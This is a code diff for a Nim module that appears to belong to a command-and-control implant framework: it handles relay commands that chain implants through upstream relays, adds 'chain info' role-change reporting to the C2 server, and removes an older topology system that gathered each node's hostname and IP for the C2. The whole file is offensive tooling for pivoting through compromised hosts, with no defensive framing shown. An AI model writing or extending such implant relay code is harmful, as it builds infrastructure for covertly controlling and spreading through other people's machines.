@@ -1,5 +1,5 @@
 import strutils, json, times, tables
-import ../../core/relay/[relay_protocol, relay_comm, relay_config, relay_topology]
+import ../../core/relay/[relay_protocol, relay_comm, relay_config]
 import ../../util/sysinfo
 
 # Local adaptive timeout calculation to avoid circular imports
@@ -11,6 +11,10 @@ proc getLocalAdaptiveTimeout(): int =
 var g_relayServer*: RelayServer
 var upstreamRelay*: RelayConnection
 var isConnectedToRelay* = false
+
+# Global variables for immediate chain info updates
+var g_immediateChainInfoUpdate*: bool = false
+var g_pendingChainInfo*: tuple[role: string, parentGuid: string, port: int]
 
 # Helper functions for main.nim compatibility
 proc isRelayServer*(): bool = g_relayServer.isListening
@@ -70,12 +74,26 @@ proc processRelayCommand*(cmd: string): string =
                 when defined debug:
                     echo "[DEBUG] 🔧 RELAY COMMANDS: ✅ Relay server started successfully!"
                 
-                # TOPOLOGY EVENT: Detect hybrid transition
-                # If we have a relay client ID, this means we're becoming hybrid
-                if relay_topology.g_relayClientID != "" and relay_topology.g_relayClientID != "PENDING-REGISTRATION":
+                # IMMEDIATE CHAIN INFO REPORTING: Role change detected
+                var newRole = "RELAY_SERVER"
+                var parentGuid = ""
+                
+                # If we have an upstream connection, this means we're becoming hybrid
+                if upstreamRelay.isConnected:
+                    newRole = "RELAY_HYBRID"
+                    # TODO: Get parent GUID from upstream relay connection
                     when defined debug:
-                        echo "[DEBUG] 🌐 TOPOLOGY: Client " & relay_topology.g_relayClientID & " becoming HYBRID on port " & $port
-                    # Note: detectHybridTransition will be defined below
+                        echo "[DEBUG] 🔗 Chain Info: HYBRID transition detected - Client becoming HYBRID on port " & $port
+                else:
+                    when defined debug:
+                        echo "[DEBUG] 🔗 Chain Info: SERVER role detected - Starting relay server on port " & $port
+                
+                # Signal main loop to send chain info immediately on next cycle
+                g_immediateChainInfoUpdate = true
+                g_pendingChainInfo = (newRole, parentGuid, port)
+                
+                when defined debug:
+                    echo "[DEBUG] 🔗 Chain Info: Scheduled immediate update - Role: " & newRole & ", Port: " & $port
                 
                 return "Relay server started on port " & $port
             else:
@@ -139,7 +157,20 @@ proc processRelayCommand*(cmd: string): string =
                 let registerMsg = createMessage(REGISTER, implantID, route, $regData)
                 
                 if sendMessage(upstreamRelay, registerMsg):
+                    # IMMEDIATE CHAIN INFO REPORTING: Role change detected
+                    var newRole = "RELAY_CLIENT"
+                    if g_relayServer.isListening:
+                        newRole = "RELAY_HYBRID"
+                    
+                    # TODO: Get parent GUID from upstream relay connection
+                    var parentGuid = ""
+                    
+                    # Signal main loop to send chain info immediately on next cycle
+                    g_immediateChainInfoUpdate = true
+                    g_pendingChainInfo = (newRole, parentGuid, g_relayServer.port)
+                    
                     when defined debug:
+                        echo "[DEBUG] 🔗 Chain Info: CONNECTION transition detected - Role: " & newRole
                         echo "[DEBUG] Connected and registered with upstream relay, HTTP communication disabled"
                     return "Connected to upstream relay at " & host & ":" & $port 
                 else:
@@ -154,6 +185,18 @@ proc processRelayCommand*(cmd: string): string =
             return "Not connected to any upstream relay"
         
         try:
+            # IMMEDIATE CHAIN INFO REPORTING: Role change detected
+            var newRole = "STANDARD"
+            if g_relayServer.isListening:
+                newRole = "RELAY_SERVER"
+            
+            # Signal main loop to send chain info immediately on next cycle
+            g_immediateChainInfoUpdate = true
+            g_pendingChainInfo = (newRole, "", g_relayServer.port)
+            
+            when defined debug:
+                echo "[DEBUG] 🔗 Chain Info: DISCONNECTION transition detected - Role: " & newRole
+            
             # USE SAFE FUNCTION FROM relay_comm.nim
             closeConnection(upstreamRelay)
             isConnectedToRelay = false  # Re-enable HTTP communication
@@ -191,6 +234,27 @@ proc processRelayCommand*(cmd: string): string =
             return "Relay server is not running"
         
         try:
+            # IMMEDIATE CHAIN INFO REPORTING: Role change detected
+            var newRole = "STANDARD"
+            var parentGuid = ""
+            
+            # If we were hybrid and stop relay server, we become relay client
+            if upstreamRelay.isConnected:
+                newRole = "RELAY_CLIENT"
+                # TODO: Get parent GUID from upstream relay connection
+                when defined debug:
+                    echo "[DEBUG] 🔗 Chain Info: HYBRID->CLIENT transition detected - Stopping relay server"
+            else:
+                when defined debug:
+                    echo "[DEBUG] 🔗 Chain Info: SERVER->STANDARD transition detected - Stopping relay server"
+            
+            # Signal main loop to send chain info immediately on next cycle
+            g_immediateChainInfoUpdate = true
+            g_pendingChainInfo = (newRole, parentGuid, 0)
+            
+            when defined debug:
+                echo "[DEBUG] 🔗 Chain Info: Scheduled immediate update - Role: " & newRole
+            
             # USE SAFE FUNCTION FROM relay_comm.nim
             closeRelayServer(g_relayServer)
             return "Multi-client relay server stopped (secure shutdown)"
@@ -313,220 +377,6 @@ proc cleanupRelayConnections*() =
     if g_relayServer.isListening:
         cleanupConnections(g_relayServer)
 
-# ============================================================================
-# TOPOLOGY MANAGEMENT AND EVENT PROPAGATION SYSTEM
-# ============================================================================
-
-# Import topology types and functions from relay_topology module
-# (already imported above)
-
-# Track previous client state to detect changes
-var g_previousClients: seq[string] = @[]
-var g_lastTopologyCheck: int64 = 0
-
-# Create RelayNodeInfo from system information
-proc createNodeInfo(nodeID: string, nodeType: string, isListening: bool = false, port: int = 0): RelayNodeInfo =
-    result.nodeID = nodeID
-    result.nodeType = nodeType
-    result.hostname = getSysHostname()
-    result.ipExternal = getLocalIP()
-    result.ipInternal = getLocalIP()
-    result.listeningPort = if isListening: port else: 0
-    result.upstreamHost = ""
-    result.upstreamPort = 0
-    result.directChildren = @[]
-    result.lastSeen = epochTime().int64
-
-# Propagate topology update to upstream (C2 or parent relay)
-proc propagateTopologyUpdate(eventType: string, nodeInfo: RelayNodeInfo) =
-    when defined debug:
-        echo "[DEBUG] 🌐 Topology: Propagating " & eventType & " for node " & nodeInfo.nodeID
-    
-    # If we're connected to upstream relay, send via relay
-    if upstreamRelay.isConnected:
-        let topologyMsg = createTopologyUpdateMessage(
-            relay_topology.g_relayClientID,
-            @[relay_topology.g_relayClientID, "RELAY-SERVER"],
-            eventType,
-            nodeInfo
-        )
-        
-        let success = sendMessage(upstreamRelay, topologyMsg)
-        when defined debug:
-            if success:
-                echo "[DEBUG] 🌐 Topology: Sent " & eventType & " to upstream relay"
-            else:
-                echo "[DEBUG] 🌐 Topology: Failed to send " & eventType & " to upstream relay"
-    else:
-        # Send directly to C2 server via HTTP
-        when defined debug:
-            echo "[DEBUG] 🌐 Topology: Sending " & eventType & " to C2 via HTTP"
-        
-        try:
-            # Create topology update message
-            let topologyData = %*{
-                "type": eventType,
-                "timestamp": epochTime().int64,
-                "topology": {
-                    "root": {
-                        "id": relay_topology.g_localTopology.rootNodeID,
-                        "type": "relay_server"
-                    },
-                    "nodes": relay_topology.g_localTopology.nodes,
-                    "event_node": nodeInfo
-                }
-            }
-            
-            when defined debug:
-                echo "[DEBUG] 🌐 Topology: Prepared topology data for C2: " & $topologyData
-                echo "[DEBUG] 🌐 Topology: HTTP send to C2 will be handled by main loop"
-                
-            # Store topology data globally for main loop to send
-            # This will be handled by the main HTTP communication loop
-            
-        except Exception as e:
-            when defined debug:
-                echo "[DEBUG] 🌐 Topology: Error preparing topology data: " & e.msg
-
-# Detect and report topology changes
-proc detectTopologyChanges*() =
-    if not g_relayServer.isListening:
-        return
-    
-    let currentTime = epochTime().int64
-    
-    # Only check every 5 seconds to avoid spam
-    if currentTime - g_lastTopologyCheck < 5:
-        return
-    
-    g_lastTopologyCheck = currentTime
-    
-    # Get current connected clients
-    let currentClients = getConnectedClients(g_relayServer)
-    
-    # Initialize topology if needed
-    if not relay_topology.g_topologyInitialized:
-        relay_topology.g_localTopology = initTopologyInfo(getRelayServerID())
-        relay_topology.g_topologyInitialized = true
-        
-        # Add ourselves as the root relay server
-        let relayServerInfo = createNodeInfo(
-            getRelayServerID(), 
-            "relay_server", 
-            true, 
-            g_relayServer.port
-        )
-        updateNodeInTopology(relay_topology.g_localTopology, relayServerInfo)
-        
-        when defined debug:
-            echo "[DEBUG] 🌐 Topology: Initialized with relay server " & getRelayServerID()
-    
-    # Detect new connections
-    for clientID in currentClients:
-        if clientID notin g_previousClients:
-            when defined debug:
-                echo "[DEBUG] 🌐 Topology: New client connected: " & clientID
-            
-            # Create node info for new client
-            var clientInfo = createNodeInfo(clientID, "relay_client")
-            clientInfo.upstreamHost = relay_topology.g_localTopology.nodes[getRelayServerID()].ipInternal
-            clientInfo.upstreamPort = g_relayServer.port
-            
-            # Update local topology
-            updateNodeInTopology(relay_topology.g_localTopology, clientInfo)
-            
-            # Add as child to relay server
-            addChildToNode(relay_topology.g_localTopology, getRelayServerID(), clientID)
-            
-            # Propagate the connection event
-            propagateTopologyUpdate("node_connected", clientInfo)
-    
-    # Detect disconnections
-    for prevClientID in g_previousClients:
-        if prevClientID notin currentClients:
-            when defined debug:
-                echo "[DEBUG] 🌐 Topology: Client disconnected: " & prevClientID
-            
-            # Get node info before removing
-            if relay_topology.g_localTopology.nodes.hasKey(prevClientID):
-                let disconnectedInfo = relay_topology.g_localTopology.nodes[prevClientID]
-                
-                # Remove from local topology
-                removeNodeFromTopology(relay_topology.g_localTopology, prevClientID)
-                
-                # Propagate the disconnection event
-                propagateTopologyUpdate("node_disconnected", disconnectedInfo)
-    
-    # Update previous state
-    g_previousClients = currentClients
-    
-    when defined debug:
-        if currentClients.len != g_previousClients.len:
-            echo "[DEBUG] 🌐 Topology: Client count changed: " & $g_previousClients.len & " -> " & $currentClients.len
-
-# Detect when a client becomes hybrid (starts its own relay server)
-proc detectHybridTransition*(clientID: string, newPort: int) =
-    when defined debug:
-        echo "[DEBUG] 🌐 Topology: Client " & clientID & " became hybrid on port " & $newPort
-    
-    if relay_topology.g_localTopology.nodes.hasKey(clientID):
-        # Update the node to hybrid type
-        relay_topology.g_localTopology.nodes[clientID].nodeType = "hybrid"
-        relay_topology.g_localTopology.nodes[clientID].listeningPort = newPort
-        relay_topology.g_localTopology.lastUpdated = epochTime().int64
-        
-        # Propagate the hybrid transition
-        propagateTopologyUpdate("topology_changed", relay_topology.g_localTopology.nodes[clientID])
-
-# Get complete topology for C2 reporting
-proc getCompleteTopology*(): TopologyInfo =
-    if relay_topology.g_topologyInitialized:
-        return relay_topology.g_localTopology
-    else:
-        return initTopologyInfo(getRelayServerID())
-
-# Force topology refresh and propagation
-proc refreshTopology*() =
-    when defined debug:
-        echo "[DEBUG] 🌐 Topology: Forcing topology refresh"
-    
-    g_lastTopologyCheck = 0  # Reset timer to force immediate check
-    detectTopologyChanges()
-
-# Export topology as JSON for C2 server - MINIMAL DATA FOR SECURITY
-proc exportTopologyJSON*(): string =
-    let topology = getCompleteTopology()
-    
-    # Only send node IDs and basic connectivity info - C2 will enrich with DB data
-    var nodeIDs: seq[string] = @[]
-    var connectionsJson = newJArray()
-    
-    for nodeID, nodeInfo in topology.nodes:
-        nodeIDs.add(nodeID)
-        
-        # Add parent-child relationships as JSON objects
-        for childID in nodeInfo.directChildren:
-            connectionsJson.add(%*{
-                "parent": nodeID,
-                "child": childID
-            })
-    
-    # Minimal topology data - security focused
-    var topologyJson = %*{
-        "type": "topology_update",
-        "topology": {
-            "root_node_id": topology.rootNodeID,
-            "node_ids": nodeIDs,
-            "connections": connectionsJson,
-            "last_updated": topology.lastUpdated,
-            "total_nodes": topology.nodes.len
-        }
-    }
-    
-    when defined debug:
-        echo "[DEBUG] 🔒 Topology: Sending minimal topology data (security mode)"
-        echo "[DEBUG] 🔒 Topology: Root: " & topology.rootNodeID
-        echo "[DEBUG] 🔒 Topology: Nodes: " & $nodeIDs.len
-        echo "[DEBUG] 🔒 Topology: Connections: " & $connectionsJson.len
-    
-    return $topologyJson 
+# ============================================================================  
+# LEGACY TOPOLOGY SYSTEM REMOVED - Using distributed chain relationships
+# ============================================================================ 
